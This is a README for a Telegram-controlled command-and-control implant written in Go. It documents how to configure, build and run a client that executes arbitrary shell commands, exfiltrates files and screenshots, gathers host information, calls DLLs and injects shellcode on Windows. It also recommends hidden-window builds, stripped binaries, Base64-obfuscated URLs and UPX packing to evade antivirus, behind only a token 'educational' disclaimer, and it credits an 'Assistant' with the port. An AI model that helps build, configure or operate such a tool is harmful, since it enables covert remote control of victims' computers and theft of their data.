# TG C2 Go

A lightweight, cross-platform C2 (Command & Control) client implemented in Go, controlled remotely via Telegram Bot API.

## 📋 Project Overview

TG C2 Go is a lightweight, cross-platform C2 client that enables remote control and command execution through the Telegram Bot API.

## 🚀 Key Features

- **Telegram Bot Integration**: Remote control via Telegram Bot API
- **File Management**: Upload, download, and manage files
- **Command Execution**: Execute system commands remotely
- **Injection Capabilities**: DLL calls and Shellcode injection (Windows only)
- **Screen Monitoring**: Real-time screenshot functionality
- **Information Gathering**: System info, network info, installed programs, etc.
- **Topic Management**: Intelligent Forum Topic creation and reuse
- **Cross-Platform Support**: Windows, Linux, macOS (some features have limitations)

## 📦 Project Structure

```
TG_c2_go/
├── config/           # Configuration management
│   └── api.go       # API configuration and URL management
├── telegram/         # Telegram client
│   └── client.go    # Bot API wrapper
├── core/            # Core functionality
│   ├── topic.go     # Topic management
│   ├── file_manager.go  # File management
│   └── command_loop.go  # Command loop
├── commands/        # Command processing
│   └── processor.go # Command matching and processing
├── functions/       # Function modules
│   ├── info_collector.go   # Information collection
│   ├── screen_capture.go   # Screenshot
│   ├── dll_runner.go      # DLL calls
│   └── injector.go        # Code injection
├── go.mod          # Go dependency management  
├── main.go         # Program entry point
└── README.md       # Project documentation
```

## 🛠️ Dependencies

- **github.com/shirou/gopsutil/v3** - System information collection
- **github.com/kbinani/screenshot** - Screenshot functionality
- **golang.org/x/sys** - System call support

## 🚀 Quick Start

### Step 1: Create a Telegram Bot

1. **Open Telegram** and search for [@BotFather](https://t.me/BotFather)

2. **Create a new Bot**:
   - Send `/newbot` command
   - Follow the prompts to enter the Bot name (e.g., `My C2 Bot`)
   - Enter the Bot username (must end with `bot`, e.g., `my_c2_bot`)

3. **Get Bot Token**:
   - BotFather will return a Token, format like: `1234567890:ABCdefGhiJklMnoPqrsTuvWxyz`
   - **Important**: Save this Token securely and don't share it

4. **Get Chat ID**:
   - Create a Telegram group or channel (recommended: private group)
   - Add your Bot to the group
   - Send a message to the group
   - Visit `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
   - Find the `chat` object in the returned JSON, the `id` field is the Chat ID (e.g., `-1002927089835`)

### Step 2: Configure the Client

Edit the `config/api.go` file and fill in these three configurations:

```go
BOT_TOKEN = "1234567890:ABCdefGhiJklMnoPqrsTuvWxyz"  // Get from BotFather
CHAT_ID  = "-1002927012345"                          // Your group Chat ID
BOT_NAME = "my_c2_bot"                               // Bot username (without @)
```

**That's it!** All API URLs will be automatically generated from `BOT_TOKEN`, no manual configuration needed.

### Step 3: Build the Program

```bash
# Using build script (recommended)
./build.sh  # Linux/macOS
# or
build.bat  # Windows

# The script will prompt you to choose build mode:
# 1) Release version (Windows hidden window)
# 2) Debug version (console visible)
```

### Step 4: Run the Program

```bash
# Linux/macOS
./build/TG_c2_go_linux_amd64
./build/TG_c2_go_darwin_arm64

# Windows
build\TG_c2_go_windows_amd64.exe
```

## 🔧 Configuration

### Method 1: Using Bot Token (Recommended)

Just configure three items:

```go
BOT_TOKEN = "1234567890:ABCdefGhiJklMnoPqrsTuvWxyz"
CHAT_ID  = "-1002927089835"
BOT_NAME = "my_c2_bot"
```

All API URLs are automatically generated, no manual configuration needed.

### Method 2: Manual Base64 Encoded URL Configuration (Backward Compatible)

If you prefer not to use the Token method, you can manually fill in Base64 encoded URLs:

```go
UPDATE_URL           = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDEyMzQ1Njc4OTA6QUJDLi4uL2dldFVwZGF0ZXM="
SENDMSG_URL          = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDEyMzQ1Njc4OTA6QUJDLi4uL3NlbmRNZXNzYWdl"
// ... other URLs
```

You can use the `tools/config_generator.go` tool to generate these Base64 encoded URLs.

## 🚀 Building and Running

### 1. Install Dependencies

```bash
go mod tidy
```

### 2. Configure API

Edit `config/api.go` and fill in your Bot Token, Chat ID, and Bot Name (see "Quick Start" section above for details).

### 3. Build the Program

#### Using Build Script (Recommended)

```bash
# Linux/macOS
./build.sh

# Windows
build.bat
```

The build script will prompt you to choose build mode:
- **Release version**: Windows hides console window, no black window
- **Debug version**: Console window visible, all output and logs can be seen

The build script automatically uses the following optimization flags to reduce binary size:
- `-trimpath`: Remove file path information
- `-ldflags="-s -w"`: Remove symbol table and debug information
- Windows release version additionally adds `-H windowsgui` to hide console

#### Manual Build

```bash
# Development version (not recommended, larger file size)
go build -o TG_c2_go

# Optimized version (recommended, reduces size by ~10-20%)
go build -trimpath -ldflags="-s -w" -o TG_c2_go

# Windows cross-compilation
GOOS=windows GOARCH=amd64 go build -trimpath -ldflags="-s -w" -o TG_c2_go.exe
```

#### Further Size Reduction (Optional)

If the compiled binary is still large (>6MB), consider:

1. **Using UPX compression** (may be flagged by antivirus):
   ```bash
   # Install UPX: https://upx.github.io/
   upx --best --lzma TG_c2_go
   # Can reduce size by ~50-70%, but startup time may increase
   ```

2. **Remove unused dependencies**:
   ```bash
   go mod tidy
   ```

3. **Check dependency size**:
   ```bash
   go list -json -deps | jq -r '.Deps[] | select(.Standard == false) | .Path'
   ```

**Note**: The optimized binary size is typically around 5-7MB, which is normal for Go programs.

### 4. Run the Program

```bash
./TG_c2_go        # Linux/macOS
TG_c2_go.exe      # Windows
```

## 📖 Usage Guide

### First Run

1. **Ensure Bot is added to group**: Add your created Bot to the specified Telegram group

2. **Start the client**: Run the compiled executable

3. **Automatic initialization**: The program will automatically:
   - Get public IP address
   - Connect to Telegram Bot API
   - Create or reuse Forum Topic (named with IP address)
   - Start listening for commands

4. **Verify connection**: The program will send a connection message in the Topic (if using existing Topic)

### Using Forum Topics (Recommended)

- The program automatically creates independent Forum Topics for each client IP
- The same IP reconnecting will reuse the existing Topic
- You can manage multiple clients in one group
- Topic name format: `IP: xxx.xxx.xxx.xxx`

### Viewing Logs

- **Debug version**: Can see all output in console
- **Release version** (Windows): No console window, check execution results via Telegram messages

## 📱 Telegram Bot Commands

### Basic Commands

Send the following commands in the Telegram group Topic (the `@your_bot` part can be omitted if there's only one Bot in the group):

| Command | Description | Example |
|---------|-------------|---------|
| `/screen_shot@your_bot` | Get screenshot of target host | `/screen_shot@my_c2_bot` |
| `/info_collect@your_bot` | Collect system information (CPU, memory, disk, network, etc.) | `/info_collect@my_c2_bot` |
| `/upload@your_bot <file_path>` | Upload file from specified path | `/upload@my_c2_bot C:\Windows\System32\hosts` |
| `/set_sleep_time@your_bot <seconds>` | Set command polling interval (seconds) | `/set_sleep_time@my_c2_bot 10` |
| `/setting_info@your_bot` | Show current configuration information | `/setting_info@my_c2_bot` |
| `/disconnect@your_bot` | Disconnect and exit program | `/disconnect@my_c2_bot` |

### Execute System Commands

Simply send any text message in the Topic (not starting with `/`), and the program will automatically execute it as a system command:

- **Windows**: Executed using PowerShell
- **macOS/Linux**: Executed using `sh -c`

Examples:
```
ls -la
whoami
netstat -an
```

### Advanced Features (Windows Only)

| Command | Description | Example |
|---------|-------------|---------|
| `/run_dll@your_bot <dll_name> <func_name>` | Call function in DLL | `/run_dll@my_c2_bot user32.dll MessageBoxA` |

### File Handling

- **Send regular files**: Send files in Topic, program will automatically download to `output_dir` directory
- **Shellcode injection**: When sending files, enter `inject` in Caption (title), program will execute Shellcode injection (Windows only)

### Usage Tips

1. **Command execution results**: Command execution results are returned via Telegram messages, long output will be automatically split into chunks
2. **File uploads**: Uploaded files will appear as message attachments in Topic
3. **Multi-client management**: Each client has an independent Topic, you can manage multiple targets simultaneously
4. **Topic reuse**: Clients with the same IP address will automatically reuse the same Topic

## 🔒 Security Features

1. **URL Obfuscation (Optional)**: Support Base64 encoded URL storage (backward compatible)
2. **Token Configuration**: Recommended to use Bot Token to automatically generate URLs, simplifying configuration
3. **Thread Safety**: Use mutex to protect global state
4. **Error Handling**: Comprehensive error handling and retry mechanism
5. **Memory Safety**: Go's garbage collection ensures memory safety
6. **TLS Support**: Support custom TLS configuration

## ⚠️ Platform Limitations

- **DLL calls**: Windows only
- **Shellcode injection**: Windows only
- **Some system information collection**: Cross-platform support, but Windows has more complete functionality

## ❓ FAQ

### Q: How to get Chat ID?

1. Add Bot to group
2. Send a message in the group
3. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
4. Find `"chat":{"id":-1001234567890}` in the returned JSON, this number is the Chat ID

### Q: Program shows "BOT_TOKEN not configured", what to do?

Make sure you've filled in the `BOT_TOKEN` variable in `config/api.go`. If using the old Base64 URL configuration method, make sure at least one URL is filled in.

### Q: Windows version has no window display?

This is normal behavior. Release version hides the console window. If you need to view logs, use Debug version build.

### Q: How to manage multiple clients simultaneously?

Each client will automatically create or reuse independent Forum Topics based on their public IP address. You can manage multiple clients in the same group, they don't interfere with each other.

### Q: Topic creation failed, what to do?

Check the following:
1. Does Bot have permission to create Topics in the group
2. Is Forum feature enabled in the group
3. Is Bot Token correct
4. Is network connection normal

## 🔄 Differences from Rust Version

### Advantages
- **Simpler deployment**: Single executable file, no additional runtime needed
- **Better cross-platform support**: Go's standard library provides better cross-platform compatibility
- **Memory safety**: Garbage collection mechanism prevents memory leaks
- **Faster compilation**: Go compiles faster

### Feature Parity
- ✅ All core C2 features
- ✅ Telegram Bot integration
- ✅ File management and injection
- ✅ System information collection
- ✅ Command execution
- ✅ Screenshot functionality

## 🛡️ Disclaimer

This project is for educational and research purposes only. Please comply with relevant laws and regulations. Users are responsible for their own actions.

## 🤝 Contributing

Welcome to submit Issues and Pull Requests to improve the project.

## 📄 License

This project is based on the original Rust version and inherits the same license terms.

---

**Original Author**: bamuwe  
**Go Version Port**: Assistant  
**Version**: 1.0.0  
**Last Updated**: October 31, 2025
